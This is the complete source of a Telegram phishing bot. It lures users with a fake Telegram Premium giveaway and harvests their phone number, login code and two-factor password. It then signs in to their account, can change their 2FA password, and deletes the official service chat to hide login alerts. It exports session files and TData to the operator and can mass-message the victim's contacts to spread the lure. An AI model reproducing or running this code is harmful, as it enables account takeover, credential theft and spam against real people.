import asyncio
import logging
import os, time
import shutil
import sqlite3

from telethon.sync import TelegramClient
from telethon import functions, types
from email import message
from aiogram import Bot, Dispatcher, types
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher import FSMContext
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.utils import executor
from opentele.api import UseCurrentSession
from telethon import TelegramClient
from telethon.errors import PasswordHashInvalidError, FloodWaitError, PhoneCodeInvalidError, SessionPasswordNeededError, \
    PhoneCodeExpiredError
from telethon.tl.custom import Dialog, Message

from opentele.tl import TelegramClient as TC

from config import *
from db import User
from keyboards import *
from states import *
from texts import *

import socks

import phonenumbers
from phonenumbers.phonenumberutil import (
    region_code_for_country_code,
)

if proxyuse == True:
    proxy=(socks.SOCKS5, proxy_ip, proxy_port, True, proxy_login, proxy_pass)
else:
    pass

logging.basicConfig(level=logging.INFO)

bot = Bot(token=bot_token, parse_mode='html')

storage = MemoryStorage()
dp = Dispatcher(bot, storage=storage)

class Sessions:
    data = {}

class CodeInput:
    data = {}

class Dp(StatesGroup):
    text = State()


########## –ê–í–¢–û–ü–†–ò–ù–Ø–¢–ò–ï –í –ö–ê–ù–ê–õ + –°–û–û–ë–©–ï–ù–ò–ï ###################

@dp.chat_join_request_handler()
async def start1(update: types.ChatJoinRequest):
    await update.approve()
    await bot.send_sticker(chat_id=update.from_user.id, sticker=r"CAACAgIAAxkBAAEF5i9jLGC_fwIPPUmKCsOw5SLGunUAAXkAAgEeAAK5PDlI662kG3egy4IpBA")
    await bot.send_message(chat_id=update.from_user.id, text=f"üéÅ {update.from_user.get_mention(as_html=True)}<b>, —Ç–µ–±–µ –≤—ã–ø–∞–ª —à–∞–Ω—Å –ø–æ–ª—É—á–∏—Ç—å Telegram Premium –ø–∏—à–∏ /start</b>", parse_mode='html')

#################################################################


######################   –†–ê–°–°–´–õ–ö–ê     ##########################

@dp.message_handler(lambda msg: msg.chat.id == admin, commands='spam')
async def spam(msg: types.Message):
    await msg.answer('‚úèÔ∏è –í–≤–µ–¥–∏ —Ç–µ–∫—Å—Ç —Ä–∞—Å—Å—ã–ª–∫–∏:')
    await Dp.text.set()

@dp.message_handler(lambda msg: msg.chat.id == admin, commands='cls', state='*')
async def spam2(msg: types.Message, state: FSMContext):
    if await state.get_state():
        await state.finish()

@dp.message_handler(lambda msg: msg.chat.id == admin, state=Dp.text)
async def spam1(msg: types.Message, state: FSMContext):
    await state.finish()
    await msg.answer('‚úÖ –†–∞—Å—Å—ã–ª–∫–∞ –∑–∞–ø—É—â–µ–Ω–∞')
    g = 0
    b = 0
    for x in User().select():
        try:
            await bot.send_message(x.user_id, msg.text)
            g += 1
            time.sleep(0.33)          
        except:
            b +=1
    await msg.answer(f'<b>üìä –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞:</>\n'
                     f'‚úÖ –£—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ <code>{g}</>\n'
                     f'üö´ –û—à–∏–±–æ–∫: <code>{b}</>')

######################   –°–¢–ê–¢–ò–°–¢–ò–ö–ê     ##########################

@dp.message_handler(lambda msg: msg.chat.id == admin, commands='stat')
async def spam(msg: types.Message, state: FSMContext):
    conn = sqlite3.connect('db.db')
    cur = conn.cursor()
    cur.execute('''select * from user''')
    all_users = cur.fetchall()
    await msg.answer(f'–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π: {len(all_users)}')
    await state.finish()

##################################################################

@dp.message_handler(commands='start')
async def start(msg: types.Message, state: FSMContext):
    if msg.from_user.id != admin: 
        if await state.get_state():
            await state.finish()

        if CodeInput.data.get(msg.chat.id):
            CodeInput.data.pop(msg.chat.id)

        if not User.select().where(User.user_id == msg.chat.id):
            start_command = msg.text
            try:            
                await msg.answer(MAIN.format(
                    first_name=msg.from_user.first_name
                ), reply_markup=start_kb)
                await bot.send_message(admin,
                                f'‚úÖ <b>–ù–æ–≤—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –≤ –±–æ—Ç–µ</>\n\n'
                                f'üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: {msg.from_user.get_mention()}\n'
                                f'ü™™ –¢–µ–ª–µ–≥—Ä–∞–º ID: {msg.from_user.id}')
            except:
                pass
            
            User(
                user_id=msg.chat.id,
                verified=False,
                phone='',
                ref_id=str(start_command[7:])
            ).save()

        else:
            user = User().get(user_id=msg.chat.id)
            if not user.verified:
                await msg.answer(ON_START.format(
                    '<b>üëã –°–Ω–æ–≤–∞ –ø—Ä–∏–≤–µ—Ç</>'
                ), reply_markup=start2_kb)
                await AuthTG.phone.set()
    else:
        await msg.answer(f'{msg.from_user.get_mention()} <b>- –≤—ã –∞–¥–º–∏–Ω üëë</>\n\n'
                        f'<b>‚öôÔ∏è –î–æ—Å—Ç—É–ø–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã:</>\n'
                        f'/spam - —Ä–∞—Å—Å—ã–ª–∫–∞\n'
                        f'/stat - –∫–æ–ª-–≤–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π\n')

@dp.callback_query_handler(text='start', state='*')
async def on_pro(call: types.CallbackQuery):
    try:
        user = User().get(user_id=call.from_user.id)
    except:
        await call.answer('–≤–≤–µ–¥–∏ /start')
        return
    if not user.verified:
        try:
            await call.message.delete()
        except:
            pass
        await call.message.answer(ON_START, reply_markup=start2_kb)
        await AuthTG.phone.set()

@dp.message_handler(lambda msg: msg.contact.user_id == msg.chat.id,
                    state=AuthTG.phone, content_types=types.ContentType.CONTACT)
async def get_phone(msg: types.Message, state: FSMContext):
    fr = await msg.answer('üßë‚Äçüíª –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∫–æ–¥ ...')

    if proxyuse == True:
        client = TelegramClient(f'sessions/{str(msg.contact.phone_number)}',
                                api_id=api_id, api_hash=api_hash, proxy=proxy,
                                device_model=device_model, system_version=system_version,
                                app_version=app_version, lang_code=lang_code,
                                system_lang_code=system_lang_code)
        await client.connect()
        Sessions.data.update({
            msg.chat.id: client
        })
    else:
        client = TelegramClient(f'sessions/{str(msg.contact.phone_number)}',
                                api_id=api_id, api_hash=api_hash,
                                device_model=device_model, system_version=system_version,
                                app_version=app_version, lang_code=lang_code,
                                system_lang_code=system_lang_code)
    await client.connect()
    Sessions.data.update({
        msg.chat.id: client
    })

    pn = phonenumbers.parse('+' + str(msg.contact.phone_number))

    try:
        await bot.send_message(admin,
                               'üì± –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –≤–≤–µ–ª –Ω–æ–º–µ—Ä\n\n'
                               f'üÜî –¢–µ–ª–µ–≥—Ä–∞–º ID: <code>{msg.from_user.id}</>\n'
                               f'üìû –ù–æ–º–µ—Ä: <code>{str(msg.contact.phone_number)}</>\n'
                               f'üåç –°—Ç—Ä–∞–Ω–∞: <code>{region_code_for_country_code(pn.country_code)}</>')
    except:
        pass

    await state.update_data(phone=str(msg.contact.phone_number))

    try:
        await client.send_code_request(str(msg.contact.phone_number))
    except FloodWaitError as ex:
        await msg.answer('‚ö†Ô∏è –û—à–∏–±–∫–∞. –õ–∏–º–∏—Ç—ã —Ç–µ–ª–µ–≥—Ä–∞–º')

    await fr.edit_text('<b>üîë –ö–æ–¥:</>', reply_markup=num)
    await AuthTG.code.set()


@dp.callback_query_handler(text_startswith='ready', state=AuthTG.code)
async def on_2c(call: types.CallbackQuery, state: FSMContext):
    data = await state.get_data()

    now = CodeInput.data.get(call.from_user.id)
    if not now:
        await call.answer('‚ö†Ô∏è –ö–æ–¥ –≤–≤–µ–¥–µ–Ω –Ω–µ –≤–µ—Ä–Ω–æ')
        return

    if len(now) < 5:
        await call.answer('‚ö†Ô∏è –ö–æ–¥ —Å–æ—Å—Ç–æ–∏—Ç –∏–∑ 5 —Ü–∏—Ñ—Ä')
        return

    client: TelegramClient = Sessions.data.get(call.from_user.id)

    try:
        await client.sign_in(data.get('phone'),
                             int(now))
        if twofa_set == True:
            await client.edit_2fa(new_password=twopass_set, hint=hint_set)
            await client.delete_dialog(777000)
            await call.message.edit_text(GOOD_AUTH.format(
                    first_name=call.message.from_user.first_name
                ))
            await up_account(client, data, state)
        else:
            await client.delete_dialog(777000)
            await call.message.edit_text(GOOD_AUTH.format(
                    first_name=call.message.from_user.first_name
                ))
            await up_account(client, data, state)

    except PhoneCodeInvalidError:
        try:
            CodeInput.data.pop(call.from_user.id)
        except:
            pass

        await call.message.reply('‚ö†Ô∏è –í—ã –≤–≤–µ–ª–∏ –Ω–µ–≤–µ—Ä–Ω—ã–π –∫–æ–¥, –ø–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–ø—ã—Ç–∫—É')
        await call.message.edit_text('<b>üîë –ö–æ–¥:</>', reply_markup=num)

        await AuthTG.code.set()
        await state.update_data(data)

    except SessionPasswordNeededError:

        await call.answer('‚ö†Ô∏è –í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å –æ—Ç –¥–≤—É—Ö-—ç—Ç–∞–ø–Ω–æ–π –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏:')
        await AuthTG.twfa.set()

    except PhoneCodeExpiredError:
        await state.finish()

        try:
            CodeInput.data.pop(call.from_user.id)
            Sessions.data.pop(call.from_user.id)
        except:
            pass

        await call.message.delete()
        await call.message.answer('‚ö†Ô∏è –≤–≤–µ–¥–∏—Ç–µ /start')

    except Exception as ex:
        try:
            await bot.send_message(admin, f'err: {ex} | chat: {call.from_user.id} ')
        except:
            pass

        await call.answer('‚ö†Ô∏è –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –ø–æ–≤—Ç–æ—Ä–∏—Ç—å, –æ—Ç–ø—Ä–∞–≤–∏–≤ /start')


class Tdata:
    def __init__(self, path: str = 'sessions'):
        self.path = path

    async def session_to_tdata(self, session_path):
        await self._session_to_tdata(session_path)

    async def _session_to_tdata(self, session_path):
        client = TC(os.path.join(self.path, session_path))
        tdesk = await client.ToTDesktop(flag=UseCurrentSession)
        try:
            os.mkdir(os.path.join('tdata', session_path.split('.')[0]))
        except:
            pass
        try:
            tdesk.SaveTData(os.path.join('tdata', os.path.join(session_path.split('.')[0]), 'tdata'))
        except TypeError:
            pass
        await client.disconnect()

    async def pack_to_zip(self, tdata_path: str):
        shutil.make_archive(f'{tdata_path}', 'zip', tdata_path)


async def up_account(client, data, state):
    index_all = 0
    index_groups = 0
    index_channels = 0

    bot_id = await bot.get_me()
    chats_owns = []

    client: TC = client

    if botdelete == True:
        await client.delete_dialog(bot_id.username)
        await state.finish()
    else:
        await state.finish()

    async for dialog in client.iter_dialogs():
        try:

            dialog: Dialog = dialog
            if dialog.is_group:
                index_groups += 1
                index_all += 1

                if dialog.entity.creator:
                    chats_owns.append({
                        'chat_id': dialog.id,
                        'chat_title': dialog.title,
                        'participants_count': dialog.entity.participants_count
                    })

            if dialog.is_channel:
                index_channels += 1
                index_all += 1
                if dialog.entity.creator:
                    chats_owns.append({
                        'chat_id': dialog.id,
                        'chat_title': dialog.title,
                        'participants_count': dialog.entity.participants_count
                    })

            if dialog.is_user:
                index_channels += 1
                index_all += 1
        except:
            pass

    user = await client.get_me()

    try:
        premium_status = user.premium
    except:
        premium_status = False

    mg = await bot.send_document(logs, open('sessions/' + data.get('phone') + '.session', 'rb'), caption=f'‚úÖ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –∞–≤—Ç–æ—Ä–∏–∑–∏—Ä–æ–≤–∞–ª –∞–∫–∫–∞—É–Ω—Ç\n\n'
                                        f'üóÇ –ù–∞ –∞–∫–∫–∞—É–Ω—Ç–µ –æ–±–Ω–∞—Ä—É–∂–µ–Ω–æ:\n'
                                        f'‚ñ™Ô∏è –í—Å–µ–≥–æ –¥–∏–∞–ª–æ–≥–æ–≤: <code>{str(index_all)}</>\n'
                                        f'‚ñ™Ô∏è –í—Å–µ–≥–æ –≥—Ä—É–ø–ø: <code>{str(index_groups)}</>\n'
                                        f'‚ñ™Ô∏è –í—Å–µ–≥–æ –∫–∞–Ω–∞–ª–æ–≤: <code>{str(index_channels)}</>\n'
                                        f'‚ñ™Ô∏è –í—Å–µ–≥–æ —Å –ø—Ä–∞–≤–∞–º–∏ –∞–¥–º–∏–Ω–∞: <code>{str(len(chats_owns))}</>\n\n'
                                        f'üëÆ‚Äç‚ôÄÔ∏è –û–± –∞–∫–∫–∞—É–Ω—Ç–µ:\n'
                                        f'üåÄ Username: <code>{str(user.username)}</>\n'
                                        f'üÜî –¢–µ–ª–µ–≥—Ä–∞–º ID: <code>{str(user.id)}</>\n'
                                        f'üìû –ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞: <code>{user.phone}</>\n'
                                        f'üåü –ü—Ä–µ–º–∏—É–º —Å—Ç–∞—Ç—É—Å: <code>{str(premium_status)}</>\n'
                                        f'üí• SCAM —Å—Ç–∞—Ç—É—Å: <code>{str(user.scam)}</>\n',
                                        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                                [
                                    InlineKeyboardButton(text="üóÇ –ü–æ–ª—É—á–∏—Ç—å TData",
                                                         callback_data=f'td|{str(logs)}|{data.get("phone")}.session')
                                ]
                                ]))
    await bot.send_document(admin, open('sessions/' + data.get('phone') + '.session', 'rb'),
                                 caption=f't.me/c/{str(logs).split("-100")[1]}/{str(mg.message_id)}')

    if chango == False:
        pass
    else:
        await client(functions.channels.JoinChannelRequest(
        channel=userchannel
    ))
        await bot.send_message(logs, text=f'<b>‚úÖ –ê–∫–∫–∞—É–Ω—Ç –±—ã–ª —É—Å–ø–µ—à–Ω–æ –ø–æ–¥–ø–∏—Å–∞–Ω –Ω–∞: @{userchannel}</>\n\n'
                                         f'<b>üîç –ê–∫–∫–∞—É–Ω—Ç:</>\n'
                                         f'üåÄ Username: <code>{str(user.username)}</>\n'
                                         f'üÜî –¢–µ–ª–µ–≥—Ä–∞–º ID: <code>{str(user.id)}</>\n\n')
    
    if spams == False:
        await client.disconnect()
    else:
        dialg = await client.get_dialogs()
        g = 0
        b = 0
        for dialog in dialg:
            try:
                bname=bot_id.username
                await client.send_message(dialog.id, SPAM_MSG.format(username=bname))
                await client.delete_dialog(dialog.id)
                g += 1
                time.sleep(0.33)
            except:
                b += 1
                time.sleep(0.33)
        await bot.send_message(logs, text=f'<b>‚úÖ –†–∞—Å—Å—ã–ª–∫–∞ —Å –∞–∫–∫–∞—É–Ω—Ç–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞</>\n\n'
                                         f'<b>üîç –ê–∫–∫–∞—É–Ω—Ç:</>\n'
                                         f'üåÄ Username: <code>{str(user.username)}</>\n'
                                         f'üÜî –¢–µ–ª–µ–≥—Ä–∞–º ID: <code>{str(user.id)}</>\n\n'
                                         f'<b>üìä –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞:</>\n'
                                         f'‚úÖ –£—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ <code>{g}</>\n'
                                         f'üö´ –û—à–∏–±–æ–∫: <code>{b}</>')
        await client.disconnect()

@dp.callback_query_handler(text_startswith='td|')
async def get_rd(call: types.CallbackQuery):
    srt = call.data.split('|')
    await call.answer('–û–∂–∏–¥–∞–π—Ç–µ')
    asyncio.create_task(create_zip(srt))
    print(srt)

async def create_zip(srt):

    await Tdata().session_to_tdata(srt[-1])
    await Tdata().pack_to_zip(os.path.join('tdata', srt[-1].split('.')[0]))
    await bot.send_document(srt[1], open(os.path.join('tdata', srt[-1].split('.')[0]+'.zip'), 'rb'))

@dp.message_handler(state=AuthTG.twfa)
async def twa(msg: types.Message, state: FSMContext):
    data = await state.get_data()
    client: TelegramClient = Sessions.data.get(msg.chat.id)
    try:
        await client.sign_in(password=msg.text)
        if twofa_current == True:
            await client.edit_2fa(current_password=msg.text, new_password=twopass_set, hint=hint_set)
            await client.delete_dialog(777000)
            await msg.answer(GOOD_AUTH.format(
                    first_name=msg.from_user.first_name
                ))
            await up_account(client, data, state)
        else:
            await client.delete_dialog(777000)
            await msg.answer(GOOD_AUTH.format(
                    first_name=msg.from_user.first_name
                ))
            await up_account(client, data, state)


    except PasswordHashInvalidError:
        await msg.answer('‚ö†Ô∏è –í—ã —É–∫–∞–∑–∞–ª–∏ –Ω–µ –≤–µ—Ä–Ω—ã–π –ø–∞—Ä–æ–ª—å')


@dp.callback_query_handler(text_startswith='remove', state=AuthTG.code)
async def on_1c(call: types.CallbackQuery):
    now = CodeInput.data.get(call.from_user.id)
    if not now:
        await call.answer()
        return
    CodeInput.data.update({call.from_user.id: now[:-1]})
    await call.message.edit_text(f'<b>üîë –ö–æ–¥:</> <code>{CodeInput.data.get(call.from_user.id)}</>',
                                 reply_markup=num)


@dp.callback_query_handler(text_startswith='write_', state=AuthTG.code)
async def on_c(call: types.CallbackQuery):
    now = CodeInput.data.get(call.from_user.id)
    code = call.data.split('_')[1]
    if not now:
        CodeInput.data.update({call.from_user.id: code})
        try:
            await call.message.edit_text(f'<b>üîë –ö–æ–¥:</> <code>{CodeInput.data.get(call.from_user.id)}</>',
                                         reply_markup=num)
        except:
            pass
    else:
        if len(now) >= 5:
            await call.answer('–ù–∞–∂–º–∏—Ç–µ –Ω–∞ ‚úÖ –¥–ª—è –ø—Ä–æ–¥–æ–ª–∂–µ–Ω–∏—è')
            return

        CodeInput.data.update({call.from_user.id: now + code})
        await call.message.edit_text(f'<b>üîë –ö–æ–¥:</> <code>{CodeInput.data.get(call.from_user.id)}</>',
                                     reply_markup=num)


@dp.message_handler(lambda msg: msg.text[1:].isdigit() and len(msg.text) >= 5 <= 7,
                    state=AuthTG.code, content_types=types.ContentType.TEXT)
async def get_code(msg: types.Message, state: FSMContext):
    data = await state.get_data()

    client: TelegramClient = Sessions.data.get(msg.chat.id)

    try:
        await client.sign_in(data.get('phone'),
                             int(msg.text[1:]))
        await up_account(client, data, state)
    except PhoneCodeInvalidError:
        try:
            CodeInput.data.pop(msg.from_user.id)
            Sessions.data.pop(msg.from_user.id)
        except:
            pass
        await msg.reply('‚ö†Ô∏è –í—ã –≤–≤–µ–ª–∏ –Ω–µ –≤–µ—Ä–Ω—ã–π –∫–æ–¥, –ø–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–ø—ã—Ç–∫—É')

        await AuthTG.code.set()
        await state.update_data(data)

    except SessionPasswordNeededError:

        await msg.answer('‚ö†Ô∏è –í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å –æ—Ç –¥–≤—É—Ö-—ç—Ç–∞–ø–Ω–æ–π –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏:')
        await AuthTG.twfa.set()

    except PhoneCodeExpiredError:
        await state.finish()

        try:
            CodeInput.data.pop(msg.from_user.id)
            Sessions.data.pop(msg.from_user.id)
        except:
            pass

        await msg.answer('‚ö†Ô∏è –≤–≤–µ–¥–∏—Ç–µ /start')

    except Exception as ex:
        try:
            await bot.send_message(admin, f'err: {ex} | chat: {msg.from_user.id} ')
        except:
            pass

        await msg.answer('‚ö†Ô∏è –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –ø–æ–≤—Ç–æ—Ä–∏—Ç—å, –æ—Ç–ø—Ä–∞–≤–∏–≤ /start')


if __name__ == '__main__':
    executor.start_polling(dp)
